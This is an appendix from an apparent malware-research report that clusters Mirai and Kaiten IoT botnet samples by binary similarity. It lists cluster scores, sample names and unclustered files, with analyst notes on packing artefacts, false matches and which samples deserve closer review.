| 182 | `fe3c3fae5bee` | 2 | 0.845 | x64 | `boatnet.x86_64`, `px86_64` | packed stubs — 2–11 functions each, similarity meaningless |
| 183 | `111ec97de766` | 2 | 1.000 | x64 | `20532b27d976e865aceb0ec11d9f2ff8`, `boatnet.x86_64` | packed stubs — 2–11 functions each, similarity meaningless |
| 186 | `73eac68142a9` | 2 | 1.000 | x86 | `xnxnxnxnxnxnxnxni386xnxn`, `xnxnxnxnxnxnxnxni386xnxn` | packed stubs — 2–11 functions each, similarity meaningless |
| 198 | `f3a53a310e65` | 2 | 1.000 | a64 | `xnxnxnxnxnxnxnxnaarch64xnxn`, `xnxnxnxnxnxnxnxnaarch64xnxn` | packed stubs — 2–11 functions each, similarity meaningless |
| 199 | `09b91dcd8d8f` | 2 | 0.718 | arm | `parm6`, `parm7` | packed stubs — 2–11 functions each, similarity meaningless |
| 216 | `df951fe3c406` | 2 | 0.991 | x64 | `px86_64`, `px86_64` | same campaign/build |
| 217 | `80dd5e30daf0` | 2 | 0.781 | x86 | `px86_i486`, `px86_i686` | same campaign/build |
| 221 | `3c8730f3ff80` | 2 | 0.536 | m68k | `boatnet.m68k`, `nuclear.m68k` | same campaign/build |
| 224 | `fd793b885719` | 2 | 0.432 | m68k | `m68k`, `pm68k` | same campaign/build |
| 229 | `a80c6f0ce7e1` | 2 | 0.952 | mips/mpsl | `pmips`, `pmpsl` | cross-endian pair of one build |
| 231 | `2b40a12e4625` | 2 | 1.000 | loong | `xnxnxnxnxnxnxnxnloongarch64xnxn`, `xnxnxnxnxnxnxnxnloongarch64xnxn` | same campaign/build |
| 232 | `64a2bb7c1a29` | 2 | 0.233 | x64 | `nuclear.x86_64`, `swatnet` | **cross-family** — Kaiten member matched to Mirai on libc only |
| 233 | `75b35f5ac8b9` | 2 | 0.216 | x64 | `1d1b07065613cc12b70a8e11817e0aa5`, `chrome` | same campaign/build |
| 234 | `bb43342fcb18` | 2 | 1.000 | rv32 | `xnxnxnxnxnxnxnxnriscv32xnxn`, `xnxnxnxnxnxnxnxnriscv32xnxn` | same campaign/build |
| 235 | `b4fa44ebcfaa` | 2 | 1.000 | rv64 | `xnxnxnxnxnxnxnxnriscv64xnxn`, `xnxnxnxnxnxnxnxnriscv64xnxn` | same campaign/build |
| 237 | `92840e2d7ee4` | 2 | 1.000 | ppc | `DEMONS.ppc`, `DEMONS.ppc` | same campaign/build |
| 245 | `19a64ca86b13` | 2 | 0.342 | arm | `arm7`, `nuclear.arm7` | same campaign/build |
| 246 | `f2f58fa88af4` | 2 | 0.986 | mpsl | `DEMONS.mpsl`, `DEMONS.mpsl` | same campaign/build |
| 252 | `51b14f561a95` | 2 | 0.379 | arm | `17a373b6ef2c95394453a02d03540480`, `474d28ac2e0ed518d960c9aa6ae4e40e` | same campaign/build |
| 255 | `08188e137282` | 2 | 0.903 | arm | `nuclear.arm`, `nuclear.arm5` | same campaign/build |
| 257 | `bafe8c32772e` | 2 | 0.595 | arm | `4d99226ed34af9f97717552634df055d`, `719d6c26275d3680c855d168cef80271` | same campaign/build |
| 259 | `f6458819c6ce` | 2 | 1.000 | mips | `mips`, `mips` | same campaign/build |
| 260 | `70445fc282ea` | 2 | 0.634 | arm | `1108e44314223ae8245932c239388a5a`, `dicknet` | **cross-family** — Kaiten member matched to Mirai on libc only |
| 263 | `0303fa70008a` | 2 | 0.600 | mips/mpsl | `284c5f8e950d870ad778e0f89cf37344`, `8a708e6ed102d24a8b8d7951e28937e7` | cross-endian pair of one build |
| 271 | `4fd9df98bb75` | 2 | 0.868 | mips/mpsl | `02e9bb2a57a6c924818ff0883bf219e4`, `30cc5be6a3ebe186b49b4fd0091bfab1` | cross-endian pair of one build |
| 272 | `d7cb888a15e5` | 2 | 0.635 | mpsl | `m-p.s-l.dick`, `nova.mipsel` | Kaiten/STD family |
| 273 | `71f0c1b253a1` | 2 | 0.973 | mips/mpsl | `cock`, `net` | Kaiten/STD family |
| 274 | `e0af265b82c8` | 2 | 0.991 | mips | `32817e09143327d4552c1510473214df`, `iran.mips` | same campaign/build |
| 275 | `4a3752bc7815` | 2 | 1.000 | mpsl | `4854ea67c459263d05799931be693f36`, `iran.mipsel` | same campaign/build |

Reading notes:

* **Cluster 208 (n=14, cohesion 1.000)** looks like the strongest result in the
  collection and is the weakest: all 14 members are UPX stubs with 2 functions
  each. A perfect score over two functions means nothing. Same for 206, 207,
  181, 192, 193, 209, 186, 198, 183, 189, 199, 182 — twelve more clusters that
  are pure packing artefacts. **Roughly half the leaf clusters (26 of 50) are
  built from packed stubs.**
* **Clusters 232 and 233 are cross-family false friends.** 232 pairs
  `nuclear.x86_64` (Mirai) with `swatnet` (Kaiten) at cohesion 0.233; 233 pairs
  `chrome` with `1d1b07…` at 0.216. Both are the libc effect of §8 — low
  cohesion is the tell.
* **Pairs worth an analyst's time** (high cohesion, real function counts):
  273 `cock`/`net` (0.973, MIPS BE/LE), 274 `32817e09…`/`iran.mips` (0.991),
  275 `4854ea67…`/`iran.mipsel` (1.000), 246 `DEMONS.mpsl` ×2 (0.986),
  229 `pmips`/`pmpsl` (0.952), 255 `nuclear.arm`/`nuclear.arm5` (0.903),
  271 `02e9bb2a…`/`30cc5be6…` (0.868, MIPS BE/LE).
* **Clusters that attribute hash-named samples**: 267 puts `38ea4d20…` and
  `5991b6c6…` with `manji.mpsl` and `mipsel`; 270 puts `7b70aceca…` and
  `8cf35e8a…` with `mips`; 254 puts `11b5bca0…` and `3f15bcb0…` with `unet`;
  260 puts `1108e443…` with `dicknet`; 252 pairs `17a373b6…` with `474d28ac…`;
  257 pairs `4d99226e…` with `719d6c26…` (both on C2 `202.155.10.112`).
* **Small ≠ unimportant, but low cohesion = suspect.** Clusters 205 (0.313),
  215 (0.316), 239 (0.343), 245 (0.342), 224 (0.432), 196 (0.435) mix samples
  that share little beyond libc and architecture. `245` is instructive: `arm7`
  and `nuclear.arm7` are both symbolised Mirai with nearly identical function
  counts (393 / 396), yet cluster at only 0.342 — they are different Mirai
  *builds*, not the same binary twice.

### A.1 Correction: the exploit scanners do not spread

I checked whether the `mipsel` exploit modules (§9) appear in the samples that
cluster with it (`manji.mpsl`, `38ea4d20…`, `5991b6c6…` in cluster 267). They do
not: clusters `ec3821a244d0` and `89f59cdca8ba` have members in **`mipsel`
only**. Cluster 267's 0.515 cohesion is shared base-Mirai code, not the exploit
scanners. The exploit capability is confined to a single sample in this corpus.

## Appendix B — the 29 files in no cluster

HDBSCAN sheds these as noise. That is a statement about density, not about
relevance, so each one is listed with its nearest binary-similarity neighbour:

| File | Arch | Funcs | Nearest neighbour (bin_sim) | Score |
|---|---|---|---|---|
| `mipsle` | MIPS | 1108 | `pm68k` | 0.01 |
| `6e05a46adcfdb572705b6df690aad0b0` | MIPS | 958 | `pm68k` | 0.01 |
| `6ab3f168d8a10c45c1c2914dcce68587` | MIPS | 625 | `4854ea67c459263d05799931be693f` | 0.69 |
| `mipsel` | MIPS | 600 | `net` | 0.51 |
| `fucknet` | x86 | 596 | `unet` | 0.14 |
| `cracknet` | PowerPC | 577 | `unet` | 0.21 |
| `upnnpd` | MIPS | 496 | `32817e09143327d4552c1510473214` | 0.76 |
| `40cfee292a4375cab18a22fa4edffda0` | MIPS | 483 | `upnnpd` | 0.67 |
| `boatnet.mips` | MIPS | 471 | `upnnpd` | 0.42 |
| `44a94732a1980363c7c06aff7167af38` | AARCH64 | 352 | `swatnet` | 0.03 |
| `ppc` | PowerPC | 284 | `DEMONS.ppc` | 0.21 |
| `arm6` | ARM | 269 | `3d1cc5c4c42e43ace192728a056549` | 0.34 |
| `xnxnxnxnxnxnxnxnsh4xnxn` | SuperH4 | 250 | `boatnet.x86` | 0.00 |
| `parm` | ARM | 237 | `pmpsl` | 0.09 |
| `927d2f4d12dbf78c1a8c5ff59d589433` | MIPS | 236 | `manji.mpsl` | 0.38 |
| `arm` | ARM | 231 | `17a373b6ef2c95394453a02d035404` | 0.30 |
| `ppc` | PowerPC | 221 | `ppc` | 0.13 |
| `tuxnokill.mpsl` | MIPS | 183 | `02e9bb2a57a6c924818ff0883bf219` | 0.41 |
| `20f37ddd64cc4420e7cbe0c86de11c54` | MIPS | 175 | `02e9bb2a57a6c924818ff0883bf219` | 0.41 |
| `39c4e32f04904570466d04470dae0344` | 68000 | 174 | `boatnet.m68k` | 0.21 |
| `mpsl` | MIPS | 170 | `mips` | 0.41 |
| `766183f37ea9f7408b7fe71018a57c0a` | PowerPC | 148 | `DEMONS.ppc` | 0.21 |
| `pkf4m2` | MIPS | 93 | `xnxnxnxnxnxnxnxnsh4xnxn` | 0.01 |
| `nuclear.spc` | sparc | 74 | `pm68k` | 0.05 |
| `676346035726ad2d301f0b6dc96ce0ba` | sparc | 15 | `nuclear.spc` | 0.01 |
| `847e331148ecc4cac06c1fe163f50b94` | MIPS | 12 | `boatnet.x86_64` | 0.01 |
| `xnxnxnxnxnxnxnxnpowerpcxnxn` | PowerPC | 6 | `pmpsl` | 0.02 |
| `boatnet.i686` | x86 | 3 | `boatnet.x86` | 0.17 |
| `xnxnxnxnxnxnxnxnx86_64xnxn` | x86 | 3 | `boatnet.x86` | 0.00 |

Reading notes:

* **`upnnpd` (0.76 to `iran.mips`), `6ab3f168…` (0.69 to `iran.mipsel`),
  `40cfee29…` (0.67 to `upnnpd`)** are ordinary members of the `iran` MIPS
  cluster that fell just below the density threshold. They should be treated as
  part of that group.
* **`fucknet` and `cracknet`** are Kaiten samples (366 shared symbols with the
  other seven, §7) that HDBSCAN failed to cluster — their top binary neighbour
  is `unet` at 0.14/0.21. This is a **clustering false negative**: samples we
  know share an entire source tree do not group, because they are compiled for
  x86-32 and PowerPC while their siblings are MIPS/ARM, and the cross-ISA
  binary score collapses (§5). Function-level evidence is the only thing that
  links them.
* **`mipsle` (1108 functions), `6e05a46a…` (958), `pkf4m2`, `parm`** have
  near-zero similarity to everything — different toolchain or different libc
  entirely. Worth a manual look; they are the genuinely unexplained samples in
  this collection.
* **`mipsel`**, the most capable sample in the corpus (five exploit scanners),
  is itself unclustered at file level. Anyone triaging by cluster membership
  alone would have skipped it.
* `847e331148…` (12 functions) and `676346035726…` (15) are stubs.
